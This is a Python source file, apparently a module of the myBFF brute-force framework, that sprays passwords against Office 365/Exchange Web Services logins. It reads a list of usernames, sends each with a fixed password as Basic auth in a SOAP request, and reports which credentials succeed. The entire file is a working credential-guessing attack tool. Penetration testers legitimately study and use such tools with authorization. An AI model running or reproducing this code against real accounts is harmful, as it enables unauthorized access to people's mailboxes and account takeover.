#! /bin/python
# Created by Adam Compton (tatanus)
# Part of myBFF

import base64
import httplib

class office365Brute():
    def buildConn(self, request, user, password, host, url):
        # Build authentication string, remove newline for using it in a http header
        auth = base64.encodestring("%s:%s" % (user, password)).replace('\n', '')
        conn = httplib.HTTPSConnection(host)
        conn.request("POST", url, body=request, headers={
            "Host": host,
            "Content-Type": "text/xml; charset=UTF-8",
            "Content-Length": len(request),
            "Authorization": "Basic %s" % auth
        })
        # Read the webservice response
        resp = conn.getresponse()
        status = resp.status
        data = resp.read()
        conn.close()
        return (status, data)

    def connectTest(self, config, payload):
        user = payload["username"]
        password = payload["password"]
        url = config["protocol"] + "://" + config["HOST"] + ':' + config["port"] + "/ews/Exchange.asmx"
        request = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Body>
    <FindItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
              Traversal="Shallow">
      <ItemShape>
        <t:BaseShape>Default</t:BaseShape>
      </ItemShape>
      <ParentFolderIds>
        <t:DistinguishedFolderId Id="inbox"/>
      </ParentFolderIds>
    </FindItem>
  </soap:Body>
</soap:Envelope>""".format()

        (status, data) = self.buildConn(request, user, password, config["HOST"], url)
        if (int(status) == 401):
            print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
            return
        print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])

    def payload(self, config):
        if config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'username': config["USERNAME"],
                    'password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'username': config["USERNAME"],
                'password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
